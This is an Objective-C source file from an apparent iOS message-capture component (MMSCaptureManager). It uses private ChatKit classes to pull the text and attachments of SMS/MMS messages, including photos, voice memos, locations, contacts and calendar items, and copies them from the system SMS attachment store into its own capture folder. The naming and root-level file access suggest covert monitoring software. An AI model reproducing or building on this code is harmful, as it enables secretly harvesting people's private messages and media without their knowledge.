//
//  MMSAttachmentUtils.m
//  MMSCaptureManager
//
//  Created by Makara Khloth on 2/8/13.
//  Copyright 2013 __MyCompanyName__. All rights reserved.
//

#import "MMSAttachmentUtils.h"
#import "MMSAttSavingOP.h"
#import "FxAttachment.h"

#import "CKTextMessagePart.h"
#import "CKMediaObjectMessagePart.h"
#import "CKMediaObject.h"
#import "CKCompressibleImageMediaObject.h"
#import "CKAVMediaObject.h"
#import "CKImageData.h"
#import "CKLocationMediaObject.h"
#import "CKVCalMediaObject.h"
#import "CKVCardMediaObject.h"
#import "CKDBMessage.h"
#import "CKDBMessage+IOS6.h"
#import "CKDBMessage+iOS8.h"
#import "NSConcreteAttributedString.h"

// iOS 8
#import "CKMediaObject+iOS8.h"
#import "CKCardMediaObject.h"
#import "CKCalendarMediaObject.h"
#import "CKContactMediaObject.h"
#import "CKImageMediaObject.h"
#import "CKLocationMediaObject+iOS8.h"

#import <objc/runtime.h>

@implementation MMSAttachmentUtils

@synthesize mAttachmentPath;
@synthesize mAttSavingQueue;

- (NSMutableArray *) getAttachments: (CKDBMessage *) aCKDBMessage {
	NSMutableArray *attachments = [[NSMutableArray alloc] initWithCapacity:2];
	
	id attSource = nil;
	NSString *fullPath = nil;
	for (id messagePart in [aCKDBMessage messageParts]) {
		DLog (@"messagePart = %@, class = %@", messagePart, [messagePart class]);
		if ([messagePart isKindOfClass:NSClassFromString(@"CKTextMessagePart")]) {
			NSConcreteAttributedString *text = [messagePart text];
			DLog (@"Text from text message part = %@", [text string]);
			
			NSString *message = [text string];
			NSInteger index = [message length] > 10 ? 10 : [message length];
			NSString *attFileName = [message substringToIndex:index];
			fullPath = [NSString stringWithFormat:@"%@%u_%@.txt", [self mAttachmentPath],
								  [aCKDBMessage identifier], attFileName];
			attSource = [message dataUsingEncoding:NSUTF8StringEncoding];
//			DLog (@"attSource = %@", attSource);
			
		} else if ([messagePart isKindOfClass:NSClassFromString(@"CKMediaObjectMessagePart")]) {
			CKMediaObject *mediaObject = [messagePart mediaObject];
			
			DLog (@"mediaObject             = %@", mediaObject);
			DLog (@"Class of mediaObject    = %@", [mediaObject class]);
			
			NSString *attFullPath = [mediaObject filename]; // Include the extension
			
			if ([mediaObject respondsToSelector:@selector(fileURL)]) {
				//EX file://localhost/var/root/Library/SMS/Attachments/13/03/95C6D306-3056-405B-A59F-A4E074031B9E/IMG_1037.jpg
               
                //EX file:///var/root/Library/SMS/Attachments/8b/11/2EF8402A-B0B0-43CC-B064-A194151A4960/IMG_4238.jpeg
				
                attFullPath = [NSString stringWithFormat:@"%@",[[mediaObject fileURL] absoluteURL]];
                DLog(@">>>>>>>> attFullPath: %@", attFullPath)
                
				attFullPath = [attFullPath stringByReplacingOccurrencesOfString:@"file://localhost" withString:@""];
                
                /*
                    Handle the new scheme of file
                 */
                if ([attFullPath rangeOfString:@"file://"].location != NSNotFound) {
                    //attFullPath = [attFullPath stringByReplacingOccurrencesOfString:@"file://" withString:@""];
                    attFullPath = [[mediaObject fileURL] path];
                    DLog(@"New file scheme, %@", attFullPath)
                }
                
                /*
                    Handle the symbolic link path (For Voice Memo File)
                 */
                
                NSDictionary *attr	= [[NSFileManager defaultManager] attributesOfItemAtPath:attFullPath error:NULL];
                if ([[attr objectForKey:NSFileType] isEqualToString:NSFileTypeSymbolicLink]) {
                    NSString *actualPathForSymbolicLink = [[NSFileManager defaultManager] destinationOfSymbolicLinkAtPath:attFullPath error:NULL];
                    DLog(@"Actual path for symbolic link: %@", actualPathForSymbolicLink)
                }
			}
			
			fullPath = [NSString stringWithFormat:@"%@%u_%@", [self mAttachmentPath],
						[aCKDBMessage identifier], [attFullPath lastPathComponent]];
			
			Class $CKLocationMediaObject = objc_getClass("CKLocationMediaObject");
			Class $CKVCalMediaObject = objc_getClass("CKVCalMediaObject");
			Class $CKVCardMediaObject = objc_getClass("CKVCardMediaObject");
            
			if ([mediaObject isKindOfClass:$CKLocationMediaObject]) {
				fullPath = [NSString stringWithFormat:@"%@%u_%@", [self mAttachmentPath],
							[aCKDBMessage identifier], @"location.vcf"];
			} else if ([mediaObject isKindOfClass:$CKVCalMediaObject]) {
				fullPath = [NSString stringWithFormat:@"%@%u_%@", [self mAttachmentPath],
							[aCKDBMessage identifier], @"calendar.vcs"];
			} else if ([mediaObject isKindOfClass:$CKVCardMediaObject]) {
				fullPath = [NSString stringWithFormat:@"%@%u_%@", [self mAttachmentPath],
							[aCKDBMessage identifier], @"contact.vcf"];
			}
			
			// Since we explicitly create CKDBMessage, getting attachment data is no longer work
//			if ([mediaObject isKindOfClass:NSClassFromString(@"CKCompressibleImageMediaObject")]) {
//				CKImageData *ckImageData = [(CKCompressibleImageMediaObject *)mediaObject imageData];
//				attSource = [ckImageData data];
//			} else {
//				attSource = [mediaObject data] ? [mediaObject data] : [mediaObject dataForMedia];
//			}
			
			// It probably take long time to read data from file thus do it in operation, also attachment is not available
//			attSource = [NSData dataWithContentsOfFile:attFullPath];
//			DLog (@"attSource = %@", attSource);
			
			// NOTE:
			// attFullPath: /var/root/Library/SMS/Attachments/78/08/709612F5-C2BC-4854-AC1C-881DE33AA102/IMG_5308.jpg
			// but real file is /var/mobile/Library/SMS/Attachments/78/08/709612F5-C2BC-4854-AC1C-881DE33AA102/IMG_5308.jpg
			// thus replace /var/root/Library with /var/mobile/Library
			DLog(@"attFullPath, %@" ,attFullPath);
			attSource = [attFullPath stringByReplacingOccurrencesOfString:@"/var/root/Library" withString:@"/var/mobile/Library"];
		}
		
		FxAttachment *attachment = [[FxAttachment alloc] init];
		[attachment setFullPath:fullPath];
		[attachments addObject:attachment];
		[attachment release];
		
		DLog (@"Attachment -- fullPath  = %@", fullPath);
		DLog (@"Attachment -- attSource = %@", attSource);
		
		// Create operation to save data to file
		MMSAttSavingOP *op = [[MMSAttSavingOP alloc] init];
		[op setQueuePriority:NSOperationQueuePriorityNormal];
		[op setMAttFullPath:fullPath];
		[op setMAttSource:attSource];
		[mAttSavingQueue addOperation:op];
		[op release];
	}
	return ([attachments autorelease]);
}

- (NSMutableArray *) getAttachments8: (CKDBMessage *) aCKDBMessage {
    NSMutableArray *attachments = [NSMutableArray array];
    
    Class $CKImageMediaObject = objc_getClass("CKImageMediaObject");
    Class $CKMediaObject = objc_getClass("CKMediaObject");
    
    id attSource = nil;
	NSString *fullPath = nil;
    
    // Text
    NSString *text = [aCKDBMessage previewText]; // If we used 'text' method there will be junk character in prefix
    if ([text length] > 0) {
        NSInteger index = [text length] > 10 ? 10 : [text length];
        NSString *attFileName = [text substringToIndex:index];
        
        fullPath = [NSString stringWithFormat:@"%@%u_%@.txt", [self mAttachmentPath], [aCKDBMessage identifier], attFileName];
        attSource = [text dataUsingEncoding:NSUTF8StringEncoding];
        
        DLog (@"Attachment text --> fullPath  = %@", fullPath);
        DLog (@"Attachment text --> attSource = %@", attSource);
        
        FxAttachment *attachment = [[FxAttachment alloc] init];
        [attachment setFullPath:fullPath];
        [attachments addObject:attachment];
        [attachment release];
        
        // Create operation to save text to file
        MMSAttSavingOP *op = [[MMSAttSavingOP alloc] init];
		[op setQueuePriority:NSOperationQueuePriorityNormal];
		[op setMAttFullPath:fullPath];
		[op setMAttSource:attSource];
		[mAttSavingQueue addOperation:op];
		[op release];
        
        attSource = nil;
        fullPath = nil;
    }
    
    for (id ckObject in [aCKDBMessage mediaObjects]) {
        if ([ckObject isKindOfClass:$CKImageMediaObject]) { // Image
            
        }
        
        if ([ckObject isKindOfClass:$CKMediaObject]) {
			CKMediaObject *mediaObject = ckObject;
			
			DLog (@"mediaObject             = %@", mediaObject);
			DLog (@"Class of mediaObject    = %@", [mediaObject class]);
			
			NSString *attFullPath = [mediaObject filename]; // Include the extension
			
			if ([mediaObject respondsToSelector:@selector(fileURL)]) {
				// e.g: file://localhost/var/root/Library/SMS/Attachments/13/03/95C6D306-3056-405B-A59F-A4E074031B9E/IMG_1037.jpg
                // e.g: file:///var/root/Library/SMS/Attachments/8b/11/2EF8402A-B0B0-43CC-B064-A194151A4960/IMG_4238.jpeg
				
                attFullPath = [NSString stringWithFormat:@"%@", [[mediaObject fileURL] absoluteURL]];
                DLog(@">>>>>>>> attFullPath: %@", attFullPath)
                
				attFullPath = [attFullPath stringByReplacingOccurrencesOfString:@"file://localhost" withString:@""];
                
                /*
                 Handle the new scheme of file
                 */
                if ([attFullPath rangeOfString:@"file://"].location != NSNotFound) {
                    //attFullPath = [attFullPath stringByReplacingOccurrencesOfString:@"file://" withString:@""];
                    attFullPath = [[mediaObject fileURL] path];
                    DLog(@"New file scheme, %@", attFullPath)
                }
                
                /*
                 Handle the symbolic link path (For Voice Memo File)
                 */
                
                NSDictionary *attr = [[NSFileManager defaultManager] attributesOfItemAtPath:attFullPath error:NULL];
                if ([[attr objectForKey:NSFileType] isEqualToString:NSFileTypeSymbolicLink]) {
                    NSString *actualPathForSymbolicLink = [[NSFileManager defaultManager] destinationOfSymbolicLinkAtPath:attFullPath error:NULL];
                    DLog(@"Actual path for symbolic link: %@", actualPathForSymbolicLink)
                }
			}
			
			fullPath = [NSString stringWithFormat:@"%@%u_%@", [self mAttachmentPath], [aCKDBMessage identifier], [attFullPath lastPathComponent]];
			
			Class $CKLocationMediaObject = objc_getClass("CKLocationMediaObject");
			Class $CKCalendarMediaObject = objc_getClass("CKCalendarMediaObject");
			Class $CKContactMediaObject = objc_getClass("CKContactMediaObject");
            
			if ([mediaObject isKindOfClass:$CKLocationMediaObject]) {
				fullPath = [NSString stringWithFormat:@"%@%u_%@", [self mAttachmentPath], [aCKDBMessage identifier], @"location.vcf"];
			} else if ([mediaObject isKindOfClass:$CKCalendarMediaObject]) {
				fullPath = [NSString stringWithFormat:@"%@%u_%@", [self mAttachmentPath], [aCKDBMessage identifier], @"calendar.vcs"];
			} else if ([mediaObject isKindOfClass:$CKContactMediaObject]) {
				fullPath = [NSString stringWithFormat:@"%@%u_%@", [self mAttachmentPath], [aCKDBMessage identifier], @"contact.vcf"];
			}
            
			/*
             *
             NOTE:
                - attFullPath: /var/root/Library/SMS/Attachments/78/08/709612F5-C2BC-4854-AC1C-881DE33AA102/IMG_5308.jpg
                - Real file location: /var/mobile/Library/SMS/Attachments/78/08/709612F5-C2BC-4854-AC1C-881DE33AA102/IMG_5308.jpg
                
                So we need to replace '/var/root/Library' with '/var/mobile/Library'
             *
             */
            
			DLog(@"attFullPath, %@", attFullPath);
			attSource = [attFullPath stringByReplacingOccurrencesOfString:@"/var/root/Library" withString:@"/var/mobile/Library"];
            
            FxAttachment *attachment = [[FxAttachment alloc] init];
            [attachment setFullPath:fullPath];
            [attachments addObject:attachment];
            [attachment release];
            
            DLog (@"Attachment media --> fullPath  = %@", fullPath);
            DLog (@"Attachment media --> attSource = %@", attSource);
            
            // Create operation to save media data to file
            MMSAttSavingOP *op = [[MMSAttSavingOP alloc] init];
            [op setQueuePriority:NSOperationQueuePriorityNormal];
            [op setMAttFullPath:fullPath];
            [op setMAttSource:attSource];
            [mAttSavingQueue addOperation:op];
            [op release];
		}
    }
    
    return (attachments);
}

- (void) dealloc {
	[mAttachmentPath release];
	[super dealloc];
}

@end
